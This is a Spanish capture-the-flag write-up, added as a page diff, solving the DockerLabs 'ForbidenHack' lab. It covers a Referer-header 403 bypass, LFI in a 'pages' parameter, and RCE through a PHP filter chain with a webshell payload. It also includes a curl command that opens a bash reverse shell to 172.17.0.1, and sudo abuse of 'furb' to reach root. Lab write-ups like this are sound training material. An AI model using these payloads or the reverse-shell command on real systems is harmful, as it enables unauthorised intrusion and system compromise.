@@ -1,0 +1,272 @@
+---
+title: ForbidenHack
+description: Resolución completa de la máquina virtual *ForbidenHack* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **ForbidenHack**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que utiliza un virtual host configurado para devolver un error 403. Mediante el uso del encabezado `Referer`, se logra el bypass de la restricción de acceso, revelando la existencia de un parámetro vulnerable a **LFI (Local File Inclusion)**.
+A través de una cadena de filtros de PHP, se obtiene ejecución remota de comandos y una reverse shell como `www-data`. Posteriormente, se encuentra un archivo oculto con credenciales codificadas en Base64 del usuario `bambi`, permitiendo el acceso a esta cuenta. Finalmente, se abusa del binario `furb` con permisos sudo para leer archivos restringidos y obtener la contraseña de `root`, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'ForbidenHack',
+    Autor: 'd1se0',
+    Dificultad: 'Fácil',
+    Fecha: '14/01/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip ForbidenHack.zip
+sudo bash auto_deploy.sh ForbidenHack.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p ForbidenHack/{content,exploits,nmap,scripts}
+cd ForbidenHack
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763355834/Ports_fiaoas.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763355833/Gobuster_j9atmh.png)
+
+**Ruta encontrada:**
+- `/index.html` — Página básica sin información útil.
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763355833/Index_m16dse.png)
+
+La página HTML hace referencia a un archivo ubicado en `/var/www/bypass403.pw/index.php`, indicando el uso de **virtual hosts**. Se añade el dominio al archivo `/etc/hosts`:
+
+```bash
+echo '172.17.0.2  bypass403.pw' | sudo tee -a /etc/hosts
+```
+
+Al acceder al dominio:
+
+![Bypass403](https://res.cloudinary.com/dewqswzke/image/upload/v1763355832/Bypass403_vg0myc.png)
+
+Se obtiene un **403 Forbidden**.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Bypass 403
+
+El dominio sugiere un **bypass 403**. Se prueba el encabezado `Referer`:
+
+```
+Referer: http://bypass403.pw
+```
+
+Se obtiene acceso:
+
+![Forbidden](https://res.cloudinary.com/dewqswzke/image/upload/v1763355833/Forbidden_em9kwf.png)
+
+### 2.2 Fuzzing de parámetros
+
+El mensaje "Cuántos secretos guarda esta web" sugiere la existencia de rutas ocultas. Se realiza fuzzing de parámetros:
+
+```bash
+ffuf -u http://bypass403.pw/index.php?FUZZ=/etc/passwd \
+     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+     -mc all -fs 0,1192 -hc 403 -t 100
+```
+
+![Ffuf](https://res.cloudinary.com/dewqswzke/image/upload/v1763355833/Ffuf_tp9znv.png)
+
+El parámetro **pages** permite un **LFI (Local File Inclusion)**:
+
+```bash
+curl -k "http://bypass403.pw/index.php?pages=/etc/passwd" \
+     -H "Referer: http://bypass403.pw/index.php"
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1763355834/Passwd_yqibsi.png)
+
+### 2.3 RCE mediante filtros PHP
+
+Se utiliza una cadena de filtros de PHP para ejecución remota de comandos:
+
+```bash
+php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+```
+
+Se abre un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se envía el payload para obtener la reverse shell:
+
+```bash
+curl --get --data-urlencode "a=bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'" \
+     --data-urlencode "pages=php://filter/...<cadena completa>..." \
+     -H "Referer: http://bypass403.pw" \
+     http://bypass403.pw/index.php
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1763355836/ReverseShell_nvykp4.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → bambi
+
+En `/home/bambi/` se encuentra un archivo `.secret`:
+
+![Bambi pass](https://res.cloudinary.com/dewqswzke/image/upload/v1763355832/BambiPass_dgmvir.png)
+
+El archivo contiene credenciales codificadas en Base64:
+
+```
+usuario:password_base64
+```
+
+Se decodifica la contraseña y se accede como `bambi`:
+
+```bash
+su bambi
+```
+
+![Bambi](https://res.cloudinary.com/dewqswzke/image/upload/v1763355832/Bambi_yvnpnm.png)
+
+### 3.2 De bambi → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1763355837/Sudo-l_na2aes.png)
+
+El usuario puede ejecutar `furb` como root sin contraseña.
+
+Se analiza el archivo `/var/backups/furbRead.txt`:
+
+![FurbRead](https://res.cloudinary.com/dewqswzke/image/upload/v1763355833/FurbRead_dlv0pf.png)
+
+Se ejecuta:
+
+```bash
+sudo furb -r /root/furbRead.txt
+```
+
+![ReadFile](https://res.cloudinary.com/dewqswzke/image/upload/v1763355835/ReadFile_h5o27i.png)
+
+El archivo contiene la contraseña de `root`. Se accede:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763355837/Root_zvwqza.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Bypass de restricción 403 mediante Referer",
+      severity: "Media",
+      impact: "Acceso a contenido restringido"
+    },
+    {
+      vulnerability: "Local File Inclusion (LFI) en parámetro pages",
+      severity: "Alta",
+      impact: "Lectura de archivos del sistema"
+    },
+    {
+      vulnerability: "Ejecución remota de comandos mediante filtros PHP",
+      severity: "Crítica",
+      impact: "Compromiso del sistema como www-data"
+    },
+    {
+      vulnerability: "Credenciales codificadas en Base64 en archivo oculto",
+      severity: "Alta",
+      impact: "Acceso a cuenta de usuario bambi"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en furb",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root mediante lectura de archivos"
+    },
+    {
+      vulnerability: "Contraseña de root almacenada en texto plano",
+      severity: "Crítica",
+      impact: "Compromiso total del sistema"
+    }
+  ]}
+/>
